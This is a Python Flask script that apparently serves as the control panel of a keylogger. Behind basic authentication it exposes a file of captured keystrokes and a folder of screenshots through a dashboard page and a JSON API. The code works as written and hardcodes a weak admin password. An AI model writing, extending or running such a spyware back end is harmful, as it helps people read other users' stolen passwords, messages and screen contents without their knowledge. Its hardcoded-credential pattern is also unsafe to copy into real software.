from flask import Flask, send_from_directory, request, Response, jsonify
import os
from functools import wraps

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATIC_DIR = os.path.join(BASE_DIR, "static")
DATA_FOLDER = os.path.join(BASE_DIR, "data")

USERNAME = "admin"
PASSWORD = "secret123"

app = Flask(__name__, static_folder=STATIC_DIR)  # Serve entire static folder

# --- Auth functions ---
def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def authenticate():
    return Response(
        "Authentication required", 401,
        {"WWW-Authenticate": 'Basic realm="Login Required"'}
    )

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# --- Routes ---
# Serve root and other static files
@app.route('/', defaults={'path': 'index.html'})
@app.route('/<path:path>')
def serve(path):
    return send_from_directory(STATIC_DIR, path)

# Logs dashboard (static logs.html)
@app.route('/logs')
@requires_auth
def logs_page():
    return send_from_directory(STATIC_DIR, "logs.html")

# Logs API (returns JSON data)
@app.route('/api/logs')
@requires_auth
def api_logs():
    keystrokes_file = os.path.join(DATA_FOLDER, "keystrokes.txt")
    keys = ""
    if os.path.exists(keystrokes_file):
        with open(keystrokes_file, "r", encoding="utf-8") as f:
            keys = f.read()

    images = [f"/data/{f}" for f in os.listdir(DATA_FOLDER) if f.lower().endswith(".png")]

    return jsonify({
        "keystrokes": keys,
        "images": images
    })

# Serve raw files (screenshots, etc.)
@app.route('/data/<path:filename>')
@requires_auth
def get_file(filename):
    return send_from_directory(DATA_FOLDER, filename)

if __name__ == "__main__":
    app.run(host="::", port=600)
